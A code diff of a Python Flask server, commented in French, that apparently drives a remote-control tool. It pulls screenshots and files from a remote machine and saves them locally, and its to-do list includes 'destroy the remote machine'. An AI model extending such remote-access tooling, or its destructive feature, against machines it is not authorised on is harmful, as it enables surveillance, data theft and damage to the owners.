@@ -72,9 +72,9 @@ def screeshot():
     image = requests.get(f"{BASE_URL}/screenshot")
     # Chemin du dossier contenant le script actuel
     print(image.content)
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    dir = base_dir + "\\fichiers reçus\\"
-    f = open(dir + filename, "wb")
+    base_dir = "../../../\\fichiers reçus\\"
+    dir = base_dir + filename
+    f = open(dir, "wb")
     f.write(image.content)
     f.close()
     return f"{filename} enregistré avec succès! DESTINATION: {dir}"
@@ -85,18 +85,22 @@ def screeshot():
 # download
 @app.route("/download", methods=["POST", "GET"])
 def download():
-    r = request.get_data()
-    print(r)
-    filename = json.loads(r)
-    if filename[-1] != "@":
-        return f"'{filename}' n'est pas un fichier, veillez télécharger un fichier à la fois."
-    result = requests.get(f"{BASE_URL}/download", data=r)
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    dir = base_dir + "\\fichiers reçus\\" + json.loads(r).split("\\")[-1][:-1]
-    f = open(dir, "wb")
-    f.write(result.content)
-    f.close()
-    return result.content
+    try:
+        r = request.get_data()
+        print(r.decode("utf-8"))
+        filename = r.decode("utf-8")
+        if filename[-1] != "@":
+            return json.dumps(f"'{filename}' n'est pas un fichier, veillez télécharger un fichier à la fois.")
+        base_dir = "../../../\\fichiers reçus\\"
+        dir = base_dir + filename.split("\\")[-1][:-1]
+        print("1")
+        result = requests.get(f"{BASE_URL}/download", data=r)
+        f = open(dir, "wb")
+        f.write(result.content)
+        f.close()
+        return json.dumps(f'{filename[:-1]} télécharger{result.content.decode("utf-8")}')
+    except Exception as e:
+        return json.dumps(str(e))
 
 
 if __name__ == "__main__":
@@ -111,7 +115,7 @@ if __name__ == "__main__":
 
 # Aller dans un répertoire et revenir en arrière
 
-# prendre une capture d'écran - ok
+# prendre une capture d'écran
 
 # détruire la machine distante
 
